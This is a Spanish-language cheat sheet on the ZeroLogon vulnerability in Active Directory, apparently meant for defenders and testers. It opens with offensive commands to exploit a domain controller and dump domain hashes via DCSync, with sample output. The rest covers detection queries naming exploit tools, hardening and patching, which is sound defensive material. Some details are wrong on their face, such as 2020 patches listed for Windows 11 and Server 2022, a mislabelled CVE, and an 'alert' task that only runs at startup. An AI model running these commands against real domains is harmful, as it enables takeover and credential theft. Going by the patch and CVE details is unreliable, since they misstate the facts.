# ğŸ›‘ ZeroLogon en Active Directory

---

## ğŸ“ Â¿QuÃ© es ZeroLogon?

| Concepto      | DescripciÃ³n                                                                                                 |
|---------------|------------------------------------------------------------------------------------------------------------|
| **DefiniciÃ³n**| ZeroLogon es una vulnerabilidad crÃ­tica (CVE-2020-1472) en el protocolo Netlogon de Windows que permite a un atacante sin autenticar obtener privilegios de administrador de dominio a travÃ©s de la explotaciÃ³n de un fallo en la implementaciÃ³n criptogrÃ¡fica. |
| **Requisito** | El atacante debe tener conectividad de red al controlador de dominio en el puerto 445 (SMB) y conocer el nombre del DC.                |

---

## ğŸ› ï¸ Â¿CÃ³mo funciona el ataque?

| Fase             | AcciÃ³n                                                                                         |
|------------------|------------------------------------------------------------------------------------------------|
| **ConexiÃ³n**     | El atacante se conecta al controlador de dominio a travÃ©s del protocolo Netlogon RPC/SMB.     |
| **ExplotaciÃ³n**  | EnvÃ­a mÃºltiples intentos de autenticaciÃ³n con IV (Initialization Vector) de ceros, aprovechando un fallo en la implementaciÃ³n de AES-CFB8. |
| **Reseteo**      | Al tener Ã©xito, resetea la contraseÃ±a de la cuenta de mÃ¡quina del DC a una cadena vacÃ­a.       |
| **Escalada**     | Utiliza las credenciales comprometidas para ejecutar DCSync y volcar todos los hashes del dominio. |
| **Persistencia** | Puede crear cuentas de administrador de dominio o establecer otros mÃ©todos de persistencia.     |

---

## ğŸ’» Ejemplo prÃ¡ctico ofensivo (comandos reales)

```bash
# Verificar si el DC es vulnerable a ZeroLogon
python3 zerologon_tester.py DC01 192.168.1.10

# Explotar ZeroLogon para resetear contraseÃ±a del DC
python3 cve-2020-1472-exploit.py DC01 192.168.1.10

# Una vez explotado, realizar DCSync para extraer hashes
secretsdump.py -just-dc -no-pass 'DOMAIN/DC01$@192.168.1.10'

# Alternativa con impacket
python3 zerologon.py DC01 192.168.1.10

# Restaurar la contraseÃ±a original del DC (importante para estabilidad)
python3 restorepassword.py DOMAIN/administrator@DC01 -target-ip 192.168.1.10 -hexpass [hash_original]
```

```
[*] Testing ZeroLogon vulnerability on DC01...
[*] DC01 appears to be vulnerable to ZeroLogon!
[*] Attempting to exploit...
[*] Success! Machine account password reset.
[*] Performing DCSync attack...
[+] DOMAIN\Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[+] DOMAIN\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
```

---

## ğŸ“Š DetecciÃ³n en logs y SIEM

| Campo clave                   | DescripciÃ³n                                                                 |
|-------------------------------|----------------------------------------------------------------------------|
| **EventCode = 4624**          | Logon tipo 3 (red) con cuenta de mÃ¡quina del DC desde IP externa.          |
| **EventCode = 4742**          | ModificaciÃ³n de cuenta de mÃ¡quina (reseteo de contraseÃ±a).                 |
| **EventCode = 4656**          | Acceso a objetos privilegiados (SAM, NTDS) inmediatamente despuÃ©s del reseteo. |
| **EventCode = 4768/4769**     | Solicitudes de tickets Kerberos anÃ³malas con cuenta de mÃ¡quina.            |
| **EventCode = 5136**          | Modificaciones en el directorio (cambios en cuentas crÃ­ticas).             |

### Query Splunk bÃ¡sica

```splunk
index=dc_logs sourcetype=WinEventLog:Security (EventCode=4624 OR EventCode=4742 OR EventCode=4656 OR EventCode=4768 OR EventCode=4769)
| where like(Account_Name, "%$") AND Logon_Type=3
| table _time, ComputerName, Account_Name, Source_Network_Address, EventCode
```

---

## ğŸ” Queries completas para mÃ¡s investigaciÃ³n

### 1. DetecciÃ³n de reseteo de contraseÃ±a de cuenta de mÃ¡quina

```splunk
index=dc_logs EventCode=4742 
| where like(TargetAccountName, "%$")
| table _time, TargetAccountName, SubjectAccountName, Computer, Source_Network_Address
```

### 2. Accesos RPC/SMB anÃ³malos al DC

```splunk
index=dc_logs EventCode=4624 Logon_Type=3
| where like(Account_Name, "%$") AND Source_Network_Address!="127.0.0.1"
| stats count by _time, Account_Name, Source_Network_Address, Computer
| where count > 10
```

### 3. Solicitudes de tickets Kerberos con cuentas de mÃ¡quina

```splunk
index=dc_logs (EventCode=4768 OR EventCode=4769)
| where like(Target_User_Name, "%$")
| table _time, Target_User_Name, Client_Address, Service_Name, Result_Code
```

### 4. DetecciÃ³n de DCSync post-explotaciÃ³n

```splunk
index=dc_logs EventCode=4662 Object_Type="domainDNS"
| where like(SubjectAccountName, "%$")
| table _time, SubjectAccountName, Object_Name, Operation_Type, Computer
```

### 5. MÃºltiples intentos de autenticaciÃ³n fallidos seguidos de Ã©xito

```splunk
index=dc_logs EventCode=4625 OR EventCode=4624
| where like(Account_Name, "%$")
| sort _time
| streamstats count as attempt_number by Account_Name, Source_Network_Address
| where attempt_number > 100
```

---

## ğŸ›¡ï¸ DetecciÃ³n con Windows Defender for Endpoint

### Reglas de detecciÃ³n personalizadas

```kql
// ZeroLogon - DetecciÃ³n de intentos de autenticaciÃ³n anÃ³malos
DeviceLogonEvents
| where AccountName endswith "$"
| where ActionType == "LogonFailed"
| summarize FailedAttempts = count() by DeviceId, AccountName, bin(Timestamp, 1m)
| where FailedAttempts > 50
| order by FailedAttempts desc
```

```kql
// DetecciÃ³n de herramientas de explotaciÃ³n de ZeroLogon
DeviceProcessEvents
| where ProcessCommandLine has_any ("zerologon", "CVE-2020-1472", "netlogon", "cve-2020-1472-exploit")
| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName
| order by Timestamp desc
```

```kql
// DetecciÃ³n de cambios en contraseÃ±as de cuentas de mÃ¡quina
DeviceEvents
| where ActionType == "UserAccountModified"
| where AccountName endswith "$"
| where AdditionalFields has "password"
| project Timestamp, DeviceName, AccountName, AdditionalFields
| order by Timestamp desc
```

### Alertas recomendadas

| Regla | DescripciÃ³n | Severidad |
|-------|-------------|-----------|
| **Machine Account Auth Spike** | MÃ¡s de 50 fallos de autenticaciÃ³n de cuenta de mÃ¡quina en 1 minuto | CrÃ­tica |
| **ZeroLogon Exploitation Tools** | DetecciÃ³n de herramientas de explotaciÃ³n conocidas | CrÃ­tica |
| **Machine Account Password Reset** | Cambio de contraseÃ±a en cuenta de mÃ¡quina del DC | Alta |

---

## ğŸ¦… DetecciÃ³n con CrowdStrike Falcon

### Hunting queries (Event Search)

```sql
-- DetecciÃ³n de ZeroLogon basado en fallos de autenticaciÃ³n masivos
event_platform=Win event_simpleName=UserLogonFailed
| search UserName=*$ LogonType=3
| bin _time span=1m
| stats count by ComputerName, UserName, _time
| where count > 100
| sort - count
```

```sql
-- DetecciÃ³n de herramientas de ZeroLogon
event_platform=Win event_simpleName=ProcessRollup2 
| search (CommandLine=*zerologon* OR CommandLine=*CVE-2020-1472* OR FileName=*zerologon*)
| table _time, ComputerName, UserName, FileName, CommandLine, SHA256HashData
| sort - _time
```

```sql
-- DetecciÃ³n de conexiones RPC/SMB anÃ³malas al puerto 445
event_platform=Win event_simpleName=NetworkConnectIP4
| search RemotePort=445 LocalPort!=445
| bin _time span=1m
| stats count by ComputerName, RemoteAddressIP4, _time
| where count > 50
| sort - count
```

### Custom IOAs (Indicators of Attack)

```sql
-- IOA para detectar patrones de ZeroLogon
event_platform=Win event_simpleName=AuthActivityAuditLog
| search UserName=*$ FailureReason=*
| bin _time span=30s
| stats count by ComputerName, UserName, _time
| where count > 25
```

---

## ğŸ” Queries KQL para Microsoft Sentinel

### DetecciÃ³n de ZeroLogon

```kql
// Query principal para detectar explotaciÃ³n de ZeroLogon
SecurityEvent
| where EventID in (4625, 4624)
| where TargetUserName endswith "$"
| where LogonType == 3
| summarize FailedAttempts = countif(EventID == 4625), SuccessfulAttempts = countif(EventID == 4624) by TargetUserName, IpAddress, bin(TimeGenerated, 1m)
| where FailedAttempts > 100 or (FailedAttempts > 50 and SuccessfulAttempts > 0)
| order by FailedAttempts desc
```

```kql
// CorrelaciÃ³n con herramientas de explotaciÃ³n
DeviceProcessEvents
| where ProcessCommandLine contains "zerologon" or ProcessCommandLine contains "CVE-2020-1472"
| join kind=inner (
    SecurityEvent
    | where EventID == 4625 and TargetUserName endswith "$"
    | project TimeGenerated, Computer, TargetUserName, IpAddress
) on $left.DeviceName == $right.Computer
| project TimeGenerated, DeviceName, ProcessCommandLine, TargetUserName, IpAddress
```

### Hunting avanzado

```kql
// DetecciÃ³n de cambios en cuentas de mÃ¡quina tras explotaciÃ³n
SecurityEvent
| where EventID == 4742 // Password change
| where TargetUserName endswith "$"
| join kind=inner (
    SecurityEvent
    | where EventID == 4625 and TargetUserName endswith "$"
    | summarize FailedAttempts = count() by TargetUserName, IpAddress, bin(TimeGenerated, 1h)
    | where FailedAttempts > 100
) on TargetUserName
| where TimeGenerated > TimeGenerated1 and TimeGenerated - TimeGenerated1 < 1h
| project TimeGenerated, Computer, TargetUserName, SubjectUserName, IpAddress, FailedAttempts
```

```kql
// DetecciÃ³n de DCSync post-explotaciÃ³n
SecurityEvent
| where EventID == 4662 // Object access
| where ObjectName contains "domain" and AccessMask == "0x100"
| join kind=inner (
    SecurityEvent
    | where EventID == 4742 and TargetUserName endswith "$"
    | project TimeGenerated, Computer, TargetUserName
) on Computer
| where TimeGenerated > TimeGenerated1 and TimeGenerated - TimeGenerated1 < 2h
| project TimeGenerated, Computer, SubjectUserName, ObjectName, TargetUserName
```

---

## ğŸ¦¾ Hardening y mitigaciÃ³n

| Medida                                           | DescripciÃ³n                                                                                 |
|--------------------------------------------------|--------------------------------------------------------------------------------------------|
| **Patchear inmediatamente**                      | Aplicar KB4571723, KB4571748 y todas las actualizaciones posteriores que corrigen CVE-2020-1472. |
| **Habilitar firmado SMB obligatorio**           | `Set-SmbServerConfiguration -RequireSecuritySignature $true -Force` en todos los DCs.     |
| **MonitorizaciÃ³n de cuentas de mÃ¡quina**        | Vigilar eventos 4742 y 4624 tipo 3 con cuentas terminadas en $.                          |
| **Restringir acceso RPC/SMB al DC**             | Limitar conectividad al puerto 445 solo desde sistemas autorizados.                       |
| **Configurar SIEM alertas crÃ­ticas**            | Alertas inmediatas para reseteos de contraseÃ±a de cuentas DC$ y accesos RPC anÃ³malos.     |
| **AuditorÃ­a detallada de cambios en cuentas**   | Habilitar auditorÃ­a de cambios en cuentas de equipo y servicios crÃ­ticos.                |

---

## ğŸ”§ Parches y actualizaciones

| Parche/Update | DescripciÃ³n                                                                                  |
|---------------|----------------------------------------------------------------------------------------------|
| **KB4571723** | Windows Server 2019 - Parche crÃ­tico principal para CVE-2020-1472 (ZeroLogon).             |
| **KB4571748** | Windows Server 2016 - Correcciones completas del protocolo Netlogon.                       |
| **KB4571694** | Windows Server 2012 R2 - MitigaciÃ³n esencial de vulnerabilidades criptogrÃ¡ficas Netlogon.  |
| **KB4571729** | Windows 10/11 - ProtecciÃ³n del cliente contra ataques ZeroLogon.                           |
| **KB4571756** | Windows Server 2022 - Refuerzo de validaciones criptogrÃ¡ficas en Netlogon.                 |

### Configuraciones de registro post-parche

```powershell
# Habilitar modo de compatibilidad estricto para Netlogon
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters" -Name "RequireStrongKey" -Value 1

# Configurar auditorÃ­a detallada de Netlogon
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters" -Name "DBFlag" -Value 0x2080FFFF

# Habilitar logging de eventos de seguridad crÃ­ticos
auditpol /set /subcategory:"Computer Account Management" /success:enable /failure:enable
auditpol /set /subcategory:"Other Logon/Logoff Events" /success:enable /failure:enable
```

### VerificaciÃ³n de aplicaciÃ³n de parches

```powershell
# Verificar que los parches ZeroLogon estÃ©n instalados
Get-HotFix -Id KB4571723, KB4571748, KB4571694, KB4571729

# Verificar configuraciÃ³n de Netlogon post-parche
$netlogonConfig = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters" -Name "RequireStrongKey" -ErrorAction SilentlyContinue
if ($netlogonConfig.RequireStrongKey -eq 1) {
    Write-Host "âœ“ Netlogon configurado con claves fuertes" -ForegroundColor Green
} else {
    Write-Host "âœ— ALERTA: RequireStrongKey no configurado" -ForegroundColor Red
}

# Verificar firmado SMB obligatorio
$smbConfig = Get-SmbServerConfiguration
if ($smbConfig.RequireSecuritySignature) {
    Write-Host "âœ“ Firmado SMB obligatorio habilitado" -ForegroundColor Green
} else {
    Write-Host "âœ— CRÃTICO: Firmado SMB no obligatorio" -ForegroundColor Red
}
```

### Actualizaciones crÃ­ticas de seguridad relacionadas

- **CVE-2020-1472**: ZeroLogon protocolo Netlogon (KB4571723, KB4571748)
- **CVE-2020-1424**: ElevaciÃ³n de privilegios Netlogon (KB4566424)
- **CVE-2021-26855**: Exchange Server RCE (relacionado si hay Exchange)
- **CVE-2021-34470**: FalsificaciÃ³n de respuesta Netlogon (KB5005408)

### ConfiguraciÃ³n avanzada de mitigaciÃ³n

```powershell
# Script para configuraciÃ³n defensiva completa
# Configurar polÃ­ticas de grupo para firmado SMB
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "RequireSecuritySignature" -Value 1
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" -Name "RequireSecuritySignature" -Value 1

# Configurar auditorÃ­a avanzada especÃ­fica para ZeroLogon
auditpol /set /subcategory:"Detailed Directory Service Replication" /success:enable /failure:enable
auditpol /set /subcategory:"Directory Service Access" /success:enable /failure:enable

# Configurar alertas de seguridad en tiempo real
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Command 'Send-MailMessage -To admin@company.com -Subject ALERT: Posible ZeroLogon -Body Evento crÃ­tico detectado'"
$trigger = New-ScheduledTaskTrigger -AtStartup
Register-ScheduledTask -TaskName "ZeroLogonAlert" -Action $action -Trigger $trigger
```

---

## ğŸ§‘â€ğŸ’» Â¿CÃ³mo verificar vulnerabilidad sin explotar?

```bash
# Usar scanner sin explotaciÃ³n
python3 zerologon_tester.py [DC_NAME] [DC_IP]

# Verificar con nmap y scripts NSE
nmap -p 445 --script smb-vuln-cve-2020-1472 [DC_IP]

# Verificar configuraciÃ³n desde el propio DC
Get-HotFix | Where-Object {$_.HotFixID -like "*4571*"}
```

---

## ğŸ“š Referencias

- [Microsoft Security Advisory CVE-2020-1472](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-1472)
- [ZeroLogon - HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/zerologon)
- [Secura ZeroLogon Whitepaper](https://www.secura.com/blog/zero-logon)
- [Microsoft Netlogon Elevation of Privilege Vulnerability](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-1472)